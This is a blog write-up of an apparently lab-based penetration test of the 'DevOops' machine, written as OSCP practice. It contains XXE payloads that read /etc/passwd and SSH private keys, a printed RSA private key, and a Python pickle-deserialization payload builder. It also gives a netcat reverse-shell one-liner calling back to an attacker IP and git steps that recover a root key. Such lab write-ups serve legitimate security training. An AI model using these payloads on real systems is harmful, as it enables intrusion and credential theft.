
---
layout: post
title: "devoops"
date: 2025-09-19 
categories: OSCP Playlist
---
# devoops

# Summary

- fuzz to find upload dir
- xxe to LFI private key of user or source code of feed.py
- reverse shell from vulnerable /newpost site, that execute python code with pickle.loads()
- find .git in home dir, finding interesting commit root private key
- use git checkout to get previous version of private key file
- use private key to ssh in as root

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/devoops 10.10.10.91

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 42:90:e3:35:31:8d:8b:86:17:2a:fb:38:90:da:c4:95 (RSA)
|   256 b7:b6:dc:c4:4c:87:9b:75:2a:00:89:83:ed:b2:80:31 (ECDSA)
|_  256 d5:2f:19:53:b2:8e:3a:4b:b3:dd:3c:1f:c0:37:0d:00 (ED25519)
5000/tcp open  http    Gunicorn 19.7.1
|_http-server-header: gunicorn/19.7.1
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Let’s visit port 5000:

![image.png]({{ site.baseurl }}/assets/devoops/image.png)

Let’s fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.91:5000/FUZZ -ic

feed                    [Status: 200, Size: 546263, Words: 6030, Lines: 1816, Duration: 59ms]
upload                  [Status: 200, Size: 347, Words: 44, Lines: 1, Duration: 39ms]
newpost                 [Status: 405, Size: 178, Words: 20, Lines: 5, Duration: 24ms]
```

Let’s visit the /upload page:

![image.png]({{ site.baseurl }}/assets/devoops/image%201.png)

Seems we can upload XML files. We also need Author, Subject, Content as its elements.

Let’s try uploading a xml file with the above elements

```bash
<Something>
<Author>Bob</Author>
<Subject>HIsotry</Subject>
<Content>something</Content>
</Something>
```

It worked:

![image.png]({{ site.baseurl }}/assets/devoops/image%202.png)

Now let’s try local file disclosure with xxe attack, where we can define an external entity, that references a local file we know exist e.g. /etc/passwd. Let’s see if this works; * we also note down the file path:

```bash
<!DOCTYPE any [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<Something>
<Author>&xxe;</Author>
<Subject>HIsotry</Subject>
<Content>something</Content>
</Something>
```

![image.png]({{ site.baseurl }}/assets/devoops/image%203.png)

It worked. We can now search for users and their private keys in .ssh dir. 

```bash
<!DOCTYPE any [
  <!ENTITY xxe SYSTEM "file:///home/roosa/.ssh/id_rsa">
]>
<Something>
<Author>&xxe;</Author>
<Subject>HIsotry</Subject>
<Content>something</Content>
</Something>
```

We get a private key back:

```bash
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuMMt4qh/ib86xJBLmzePl6/5ZRNJkUj/Xuv1+d6nccTffb/7
9sIXha2h4a4fp18F53jdx3PqEO7HAXlszAlBvGdg63i+LxWmu8p5BrTmEPl+cQ4J
R/R+exNggHuqsp8rrcHq96lbXtORy8SOliUjfspPsWfY7JbktKyaQK0JunR25jVk
v5YhGVeyaTNmSNPTlpZCVGVAp1RotWdc/0ex7qznq45wLb2tZFGE0xmYTeXgoaX4
9QIQQnoi6DP3+7ErQSd6QGTq5mCvszpnTUsmwFj5JRdhjGszt0zBGllsVn99O90K
m3pN8SN1yWCTal6FLUiuxXg99YSV0tEl0rfSUwIDAQABAoIBAB6rj69jZyB3lQrS
JSrT80sr1At6QykR5ApewwtCcatKEgtu1iWlHIB9TTUIUYrYFEPTZYVZcY50BKbz
ACNyme3rf0Q3W+K3BmF//80kNFi3Ac1EljfSlzhZBBjv7msOTxLd8OJBw8AfAMHB
lCXKbnT6onYBlhnYBokTadu4nbfMm0ddJo5y32NaskFTAdAG882WkK5V5iszsE/3
koarlmzP1M0KPyaVrID3vgAvuJo3P6ynOoXlmn/oncZZdtwmhEjC23XALItW+lh7
e7ZKcMoH4J2W8OsbRXVF9YLSZz/AgHFI5XWp7V0Fyh2hp7UMe4dY0e1WKQn0wRKe
8oa9wQkCgYEA2tpna+vm3yIwu4ee12x2GhU7lsw58dcXXfn3pGLW7vQr5XcSVoqJ
Lk6u5T6VpcQTBCuM9+voiWDX0FUWE97obj8TYwL2vu2wk3ZJn00U83YQ4p9+tno6
NipeFs5ggIBQDU1k1nrBY10TpuyDgZL+2vxpfz1SdaHgHFgZDWjaEtUCgYEA2B93
hNNeXCaXAeS6NJHAxeTKOhapqRoJbNHjZAhsmCRENk6UhXyYCGxX40g7i7T15vt0
ESzdXu+uAG0/s3VNEdU5VggLu3RzpD1ePt03eBvimsgnciWlw6xuZlG3UEQJW8sk
A3+XsGjUpXv9TMt8XBf3muESRBmeVQUnp7RiVIcCgYBo9BZm7hGg7l+af1aQjuYw
agBSuAwNy43cNpUpU3Ep1RT8DVdRA0z4VSmQrKvNfDN2a4BGIO86eqPkt/lHfD3R
KRSeBfzY4VotzatO5wNmIjfExqJY1lL2SOkoXL5wwZgiWPxD00jM4wUapxAF4r2v
vR7Gs1zJJuE4FpOlF6SFJQKBgHbHBHa5e9iFVOSzgiq2GA4qqYG3RtMq/hcSWzh0
8MnE1MBL+5BJY3ztnnfJEQC9GZAyjh2KXLd6XlTZtfK4+vxcBUDk9x206IFRQOSn
y351RNrwOc2gJzQdJieRrX+thL8wK8DIdON9GbFBLXrxMo2ilnBGVjWbJstvI9Yl
aw0tAoGAGkndihmC5PayKdR1PYhdlVIsfEaDIgemK3/XxvnaUUcuWi2RhX3AlowG
xgQt1LOdApYoosALYta1JPen+65V02Fy5NgtoijLzvmNSz+rpRHGK6E8u3ihmmaq
82W3d4vCUPkKnrgG8F7s3GL6cqWcbZBd0j9u88fUWfPxfRaQU3s=
-----END RSA PRIVATE KEY-----
```

Let’s also try another method in getting a foothold. First, let’s reference the source code. We know from the home page, the file name of home page is feed.py:

```bash
<!DOCTYPE any [
  <!ENTITY xxe SYSTEM "file:///home/roosa/deploy/src/feed.py">
]>
<Something>
<Author>&xxe;</Author>
<Subject>HIsotry</Subject>
<Content>something</Content>
</Something>
```

Response:

```bash
  Author: ')
def uploaded_file(filename):
    return send_from_directory(Config.UPLOAD_FOLDER,
                               filename)

@app.route("/")
def xss():
    return template('index.html')

@app.route("/feed")
def fakefeed():
   return send_from_directory(".","devsolita-snapshot.png")

@app.route("/newpost", methods=["POST"])
def newpost():
  # TODO: proper save to database, this is for testing purposes right now
  picklestr = base64.urlsafe_b64decode(request.data)
#  return picklestr
  postObj = pickle.loads(picklestr)
  return "POST RECEIVED: " + postObj['Subject']

## TODO: VERY important! DISABLED THIS IN PRODUCTION
#app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')
# TODO: Replace run-gunicorn.sh with real Linux service script
# app = DebuggedApplication(app, evalex=True, console_path='/debugconsole')

if __name__ == "__main__":
  app.run(host='0.0.0,0', Debug=True)
```

We note here that teh debugconsole is commented out. The /newpost subdir is particularly dangerous:

1. It reads raw request body bytes: `request.data`.
2. It base64-decodes them via `base64.urlsafe_b64decode(...)`.
3. It passes the decoded bytes to `pickle.loads(...)` to deserialize into a Python object.
4. It returns a string that includes `postObj['Subject']`.
- **Why this is dangerous:** `pickle.loads()` will execute arbitrary Python code embedded in the serialized data. If an attacker can send crafted data to this endpoint they can execute arbitrary code on the server (remote code execution). This is a very high-severity vulnerability.

Let’s get it to execute a reverse shell. First we have to send a POST request to the /newpost subdir, and base64 encode our payload:

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f
```

Let’s base64 encode with this script:

```bash
import pickle, base64

payload = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.7 4444 >/tmp/f"""
class temp(object):
	def __reduce__(self):
		import os
		return (os.system,(payload,))

print(base64.urlsafe_b64encode(pickle.dumps(temp())))
```

Let’s execute it as python 2:

```bash
python2 encode.py

Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi43IDQ0NDQgPi90bXAvZicKcDEKdHAyClJwMwou
```

Let’s now start a listener:

```bash
nc -lnvp 4444
```

Let’s send a POST request to /newpost:

```bash
POST /newpost HTTP/1.1
Host: 10.10.10.91:5000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Content-Type: text
Content-Length: 352

Y3Bvc2l4CnN5c3RlbQpwMAooUydybSAvdG1wL2Y7bWtmaWZvIC90bXAvZjtjYXQgL3RtcC9mfC9iaW4vc2ggLWkgMj4mMXxuYyAxMC4xMC4xNi43IDQ0NDQgPi90bXAvZicKcDEKdHAyClJwMwou
```

We now have shell

![image.png]({{ site.baseurl }}/assets/devoops/image%204.png)

Let’s get a ssh shell with the private key instead:

```bash
chmod 600 roosa.key

ssh -i roosa.key roosa@10.10.10.91
```

Let’s check our privileges:

```bash
id 

uid=1002(roosa) gid=1002(roosa) groups=1002(roosa),4(adm),27(sudo)
```

Let’s download [linpeas.sh](http://linpeas.sh) and execute it; interesting findings:

```bash
╔══════════╣ Processes with credentials in memory (root req)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory
gdm-password Not Found
gnome-keyring-daemon Not Found                                    
lightdm process found (dump creds from memory as root)
vsftpd Not Found                                                  
apache2 Not Found                                                 
sshd: process found (dump creds from memory as root)  
                                                     
                                                     
══╣ Possible private SSH keys were found!
/etc/ImageMagick-6/mime.xml
/home/roosa/deploy/resources/integration/authcredentials.key
/home/roosa/.ssh/id_rsa
/home/roosa/work/blogfeed/resources/integration/authcredentials.key
	
```

We see that roosa has a .git dir in the work dir, looking in the logs/HEAD file, we see this commit:

```bash
commit: add key for feed integration from tnerprise backend
d387abf63e05c9628a59195cec9311751bdb283f 33e87c312c08735a02fa9c796021a4a3023129ad Roosa Hakkerson <roosa@solita.fi> 1521466386 -0400commit: reverted accidental commit with proper key
33e87c312c08735a02fa9c796021a4a3023129ad dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94 Roosa Hakkerson <roosa@solita.fi> 1521549476 -0400commit: Gunicorn startup script
dfebfdfd9146c98432d19e3f7d83cc5f3adbfe94 ca3e768f2434511e75bd5137593895bd38e1b1c2 Roosa Hakkerson <roosa@solita.fi> 1521549501 -0400commit: Blogfeed app, initial version.
ca3e768f2434511e75bd5137593895bd38e1b1c2 cec54d8cb6117fd7f164db142f0348a74d3e9a70 Roosa Hakkerson <roosa@solita.fi> 1521572889 -0400commit: Debug support added to make development more agile.
cec54d8cb6117fd7f164db142f0348a74d3e9a70 26ae6c8668995b2f09bf9e2809c36b156207bfa8 Roosa Hakkerson <roosa@solita.fi> 1521574620 -0400commit: Set PIN to make debugging faster as it will no longer change every time the application code is changed. Remember to remove before production use.
26ae6c8668995b2f09bf9e2809c36b156207bfa8 7ff507d029021b0915235ff91e6a74ba33009c6d Roosa Hakkerson <roosa@solita.fi> 1522059235 -0400commit: Use Base64 for pickle feed loading
7ff507d029021b0915235ff91e6a74ba33009c6d 2225baa807443f8d6fdcc3fe0d83dd7fb74b31f7 Roosa Hakkerson <roosa@solita.fi> 1758286251 -0400commit: testing

```

It seems like he accidentally uploaded another private key. Let’s use git diff to see what changed in the proper key key commit:

```bash
cd /home/roosa/work/blogfeed/

git diff d387abf63e05c9628a59195cec9311751bdb283f 
```

![image.png]({{ site.baseurl }}/assets/devoops/image%205.png)

We can use the following command to restore the previous version of the private key:

```bash
md5sum resources/integration/authcredentials.key

f57f7e28835e631c37ad0d090ef3b6fd  resources/integration/authcredentials.key

git checkout d387abf -- resources/integration/authcredentials.key

md5sum resources/integration/authcredentials.key

d880df0f57e4143a0fcb46fdd76e270b  resources/integration/authcredentials.key

```

We can see from the md5sum, the key has changed. Let’s now transfer it back to our host and attempt to ssh in as root:

```bash
cat resources/integration/authcredentials.key
```

Now let’s connect as root:

```bash
chmod 600 priv.key

ssh -i priv.key root@10.10.10.91 
```

We now have root.

![image.png]({{ site.baseurl }}/assets/devoops/image%206.png)